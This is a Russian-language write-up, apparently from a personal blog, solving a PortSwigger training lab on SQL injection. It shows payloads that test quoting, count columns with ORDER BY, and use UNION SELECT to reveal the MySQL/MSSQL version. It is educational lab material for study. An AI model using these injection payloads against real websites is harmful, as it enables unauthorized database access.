---
title: "SQL injection attack, querying the database type and version on MySQL and Microsoft"
date: 2025-06-06
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-examining-the-database-in-sql-injection-attacks/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft"
classes: wide
---

В данной лабе есть уязвимый к **SQL injection** фильтр категории. Для прохождения лабы нужно отобразить версию БД.

```
https://0adb000a047d20be81e7ac8b00de000c.web-security-academy.net/
```

## Solution

Возьму `URL` с фильтром категоий `Pets` :

```
https://0adb000a047d20be81e7ac8b00de000c.web-security-academy.net/filter?category=Pets
```

Подберу обрамление параметра. Попробую следующий пейлоад:

```
Pets' and 1=0-- -
```


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_querying_the_database_type_and_version_on_MySQL_and_Microsoft/1.png){: height="200" .align-center}


Никакой ошибки и пустой вывод. Скорее всего обрамление `'`. 


Узнаю сколько колонок используется в запросе с помощью `ORDER BY`:

```
Pets' ORDER BY 3-- -Error
Pets' ORDER BY 2-- -OK
```

Значит используется 2 колонки. 


Попробую использовать разные варианты для отображения версии БД с помощью `UNION`:

```
Pets' and 1=0 UNION SELECT 'version', version()-- -Ok
Pets' and 1=0 UNION SELECT 'version', @@version-- -Ok
```


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_SQL_injection_attack_querying_the_database_type_and_version_on_MySQL_and_Microsoft/2.png){: height="200" .align-center}


Лаба пройдена:3 ☕ 